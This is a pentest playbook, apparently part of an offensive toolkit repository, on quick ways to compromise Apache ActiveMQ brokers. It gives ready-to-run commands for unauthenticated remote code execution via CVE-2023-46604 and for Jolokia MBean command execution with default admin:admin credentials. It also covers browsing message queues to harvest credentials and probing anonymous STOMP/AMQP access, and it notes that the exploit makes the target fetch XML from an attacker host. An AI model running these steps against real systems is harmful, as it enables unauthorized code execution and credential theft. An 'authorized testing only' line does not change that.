---
service: activemq
title: Apache ActiveMQ
ports: 61616, 8161, 5672, 61613
aliases: openwire, stomp, amqp
---

# ActiveMQ — quick wins

**When you see it:** 61616/tcp open (OpenWire) → a pre-auth RCE candidate (CVE-2023-46604);
8161/tcp open (web console / Jolokia) → try `admin:admin` for a management-plane RCE. Either
port on an unpatched broker is a straight path to code execution.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to / execute on the
> target — get sign-off, and use the repo helpers which stage cleanup.

## Triage (read-only)
```sh
nmap -sV -p 61616,8161,5672,61613 H            # confirm OpenWire/console/AMQP/STOMP + version
curl -sI http://H:8161/admin/                  # web console present? (realm prompt)
curl -s http://H:8161/api/jolokia/version      # Jolokia agent + ActiveMQ version
curl -s -u admin:admin http://H:8161/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost/BrokerVersion
```

## Quick wins

### OpenWire pre-auth RCE — CVE-2023-46604 ✏️
```sh
python3 standalones/activemq/activemq-cve-2023-46604.py --target H --exploit -- id
```
*Why:* OpenWire's marshaller instantiates an attacker-named class via a Spring
`ClassPathXmlApplicationContext` URL → unauthenticated RCE on ActiveMQ < 5.15.16 / 5.16.7 /
5.17.6 / 5.18.3. The most reliable first shot; repo helper serves the XML and payload.

### Jolokia / web-console RCE ✏️
```sh
standalones/activemq/activemq-jolokia-rce.sh --target H --user admin --pass admin --exploit -- id
```
*Why:* `admin:admin` on the console exposes Jolokia; an MBean call (`createConfiguration` /
Camel or the classic `exec`-via-MBean chain) yields command execution without touching
OpenWire.

### Read/enumerate queues (console API)
```sh
standalones/activemq/activemq-queues.sh --target H --user admin --pass admin
```
*Why:* queues carry inter-service payloads and credentials; the console REST/Jolokia API
lists queues + message counts and can browse messages with authenticated read only.

### STOMP / AMQP anonymous check
```sh
printf 'CONNECT\naccept-version:1.2\n\n\x00\n' | nc H 61613     # STOMP banner/CONNECTED?
nmap -sV --script amqp-info -p 5672 H
```
*Why:* STOMP (61613) and AMQP (5672) often allow anonymous connect on the same broker — a
second read/write path into the same queues.

## aranum helpers
- `aranumtoolkit/network/enum-activemq.sh` — dispatcher (OpenWire/console/AMQP/STOMP banner + version).
- `standalones/activemq/activemq-cve-2023-46604.py` — OpenWire RCE (`--exploit`).
- `standalones/activemq/activemq-jolokia-rce.sh` — Jolokia/console RCE (`--exploit`).
- `standalones/activemq/activemq-quickwin.sh`, `activemq-queues.sh` — fast checks / queue browse.

## Gotchas
- Console realm may use non-default creds — `admin:admin` / `admin:activemq` first, then move on.
- OpenWire RCE needs the broker to fetch your XML — outbound HTTP from the target must reach `ATT`.
- ActiveMQ **Artemis** (the newer broker) does NOT share CVE-2023-46604 (classic ActiveMQ 5.x only) — check `BrokerVersion` first.
- 5.18.3+/5.17.6+/5.16.7+/5.15.16+ are patched; confirm the exact version before firing.

## Sources
- CVE-2023-46604 advisories; Jolokia MBean RCE writeups; HackTricks `61616-pentesting-activemq`;
  `standalones/activemq/README.md`.
